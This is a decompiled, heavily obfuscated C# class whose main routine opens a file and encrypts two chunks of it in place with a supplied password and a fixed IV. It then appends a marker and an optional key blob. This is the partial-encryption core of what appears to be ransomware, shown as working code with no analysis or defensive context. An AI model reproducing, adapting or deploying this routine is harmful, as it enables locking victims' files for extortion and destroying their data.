using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using dKCpgoRVQOaTJ;

namespace UmXkJLRjSLdPF;

internal sealed class bayqjraePLNW
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int WMBevXWnDtpi(long long_0)
	{
		return (int)long_0;
	}

	public static void mGWPIcXnARDPNM(string ZegxAmreGxUO, string BpsRnnffHL, string PIaYKHTlusQJRM, byte[] JHEraHKlRjZQi = null)
	{
		try
		{
			using FileStream fileStream = new FileStream(ZegxAmreGxUO, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			int num = WMBevXWnDtpi(fileStream.Length) / 3;
			if (num < 0)
			{
				num *= -1;
			}
			int num2 = 0;
			try
			{
				num2 = Convert.ToInt32(BpsRnnffHL) * Convert.ToInt32(fileStream.Length) / 100;
				if (num2 < 0)
				{
					num2 *= -1;
				}
			}
			catch
			{
				num2 = int.MaxValue;
			}
			if (num < num2)
			{
				num2 = num - Convert.ToInt32(BpsRnnffHL) * 1000 * 1000;
			}
			int foPWjxPegTlHzk = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
			byte[] array = null;
			for (int i = 0; i < 2; i++)
			{
				byte[] byte_ = vJTYaHQAMZbh(ZegxAmreGxUO, fileStream, foPWjxPegTlHzk, num * i);
				array = (zIVCbxjNHAKEFp.mdKzwcEdehQXWzw ? vUtZRWibXvSyF.GUpZZkGETn(byte_, Encoding.ASCII.GetBytes(PIaYKHTlusQJRM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : lYhjtoZEwiP.tLpScIfWbGuwzSS(byte_, Encoding.ASCII.GetBytes(PIaYKHTlusQJRM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
				bEeVVOcfdrz(ZegxAmreGxUO, fileStream, array, num * i);
			}
		}
		catch (Exception ex)
		{
			if (zIVCbxjNHAKEFp.oGTbbrQcGNZ)
			{
				try
				{
					File.AppendAllText(zIVCbxjNHAKEFp.WkbhTUSGuRALk, getString_0(107355092) + ZegxAmreGxUO + getString_0(107365050) + ex.Message + getString_0(107396766));
				}
				catch (Exception)
				{
				}
			}
		}
		byte[] array2 = null;
		array2 = (zIVCbxjNHAKEFp.hACCsLRJUFpmHw ? Encoding.ASCII.GetBytes(zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107364965)) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366183)) + Convert.ToString(BpsRnnffHL) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366183))) : Encoding.ASCII.GetBytes(zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107364965)) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366192)) + Convert.ToString(BpsRnnffHL) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366192))));
		if (!zIVCbxjNHAKEFp.hACCsLRJUFpmHw)
		{
			using (FileStream fileStream2 = new FileStream(ZegxAmreGxUO, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
			{
				fileStream2.Write(array2, 0, array2.Length);
				return;
			}
		}
		using FileStream fileStream3 = new FileStream(ZegxAmreGxUO, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
		fileStream3.Write(JHEraHKlRjZQi, 0, JHEraHKlRjZQi.Length);
		fileStream3.Write(array2, 0, array2.Length);
	}

	public static byte[] vJTYaHQAMZbh(string PYkZZzltIdRNJC, FileStream ZzyMeLfwyDMC, int foPWjxPegTlHzk, int JurOtmcIlxApO = 0)
	{
		byte[] array = new byte[foPWjxPegTlHzk];
		ZzyMeLfwyDMC.Position = JurOtmcIlxApO;
		ZzyMeLfwyDMC.Read(array, 0, foPWjxPegTlHzk);
		return array;
	}

	public static void bEeVVOcfdrz(string qVZZOXYxMvxGjQsv, FileStream COZxbBoUObvjB, byte[] YTfXwlcIPbHtWIq, int iIuBsBuNCNOqSwgw = 0)
	{
		COZxbBoUObvjB.Position = iIuBsBuNCNOqSwgw;
		COZxbBoUObvjB.Write(YTfXwlcIPbHtWIq, 0, YTfXwlcIPbHtWIq.Length);
	}

	static bayqjraePLNW()
	{
		Strings.CreateGetStringDelegate(typeof(bayqjraePLNW));
	}
}
